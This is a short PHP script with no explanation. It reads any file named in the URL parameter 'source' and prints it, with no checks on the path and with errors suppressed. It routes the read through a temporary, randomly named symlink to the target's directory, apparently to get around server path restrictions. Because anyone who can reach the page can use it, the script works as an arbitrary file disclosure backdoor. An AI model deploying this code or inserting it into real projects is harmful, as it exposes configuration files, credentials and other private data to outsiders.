<?php

error_reporting(E_ERROR);

$filename = "" . $_GET['source'];

$pos = mb_strrpos($filename, "/");
$target = mb_substr($filename, 0, $pos);
$symlink = "#a";
for ($i = 0; $i < 4; $i++) {
    $random = rand(0, 15);
    if ($random < 10) {
        $symlink .= $random;
    } else {
        $symlink .= chr(96 + $random - 9);
    }
}
if (file_exists($symlink)) {
    rmdir($symlink);
    unlink($symlink);
}
symlink($target, $symlink);
$filename = $symlink . mb_substr($filename, $pos);

readfile($filename);

rmdir($symlink);
unlink($symlink);
?>
